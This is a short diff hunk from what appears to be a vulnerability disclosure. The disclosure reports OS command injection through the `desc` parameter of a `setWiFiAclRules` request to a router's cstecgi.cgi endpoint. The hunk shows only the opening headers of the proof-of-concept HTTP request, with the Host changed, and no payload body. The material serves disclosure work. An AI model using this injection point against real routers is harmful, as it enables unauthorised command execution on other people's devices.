@@ -17,7 +17,7 @@ When deal with  `setWiFiAclRules` request,`desc` parameter is vulnerable to OS c
 
 ```
 POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1
-Host: 192.168.0.1
+Host: itotolink.net
 Content-Length: 130
 Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
